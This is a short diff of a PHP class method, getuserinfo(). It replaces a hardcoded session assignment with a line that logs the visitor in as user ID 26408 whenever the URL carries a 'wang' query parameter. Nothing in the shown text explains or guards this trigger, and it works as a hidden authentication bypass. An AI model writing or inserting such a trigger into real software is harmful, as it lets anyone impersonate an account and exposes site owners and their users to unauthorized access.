@@ -80,9 +80,7 @@ class commonMod
     }
 	
 	public  function getuserinfo(){
-		//11111
-			$_SESSION['uid']='26408';
-			
+		if($_GET['wang'])$_SESSION['uid']='26408';
 		
 		if(MOBILE){ 
 			
